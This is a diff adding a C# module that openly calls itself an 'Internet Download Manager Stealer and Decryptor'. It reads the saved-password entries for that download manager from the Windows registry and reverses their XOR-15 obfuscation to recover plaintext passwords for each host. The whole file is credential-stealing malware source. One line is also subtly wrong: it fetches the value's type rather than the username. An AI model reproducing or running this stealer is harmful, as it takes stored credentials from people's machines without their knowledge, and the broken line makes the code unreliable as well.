@@ -1,0 +1,33 @@
+//Internet Download Manager Stealer and Decryptor
+//Coded by p0rt3m - 2012
+
+class cInternetDownloadManager
+    {
+        public static void Start()
+        {
+            RegistryKey TempSubKey;
+            RegistryKey IdmKey = Registry.CurrentUser.OpenSubKey(@"Software\DownloadManager\Passwords");
+            
+            string[] SubKeys = IdmKey.GetSubKeyNames();
+
+            foreach (string SubKeyPath in SubKeys)
+            {
+                TempSubKey = Registry.CurrentUser.OpenSubKey(@"Software\DownloadManager\Passwords\" + SubKeyPath);
+
+                string Host = SubKeyPath;
+                string Username = TempSubKey.GetValueKind("User").ToString();
+                string Password = Decrypt((string)TempSubKey.GetValue("EncPassword"));
+            }
+        }
+
+        public static string Decrypt(string CipherText)
+        {
+            string Temp = "";
+            foreach (string strSingle in CipherText.Split(','))
+            {
+                Temp += (char)(Convert.ToInt32(strSingle, 16) ^ 15);
+            }
+
+            return Temp.Substring(0,Temp.Length-1);
+        }
+    } 
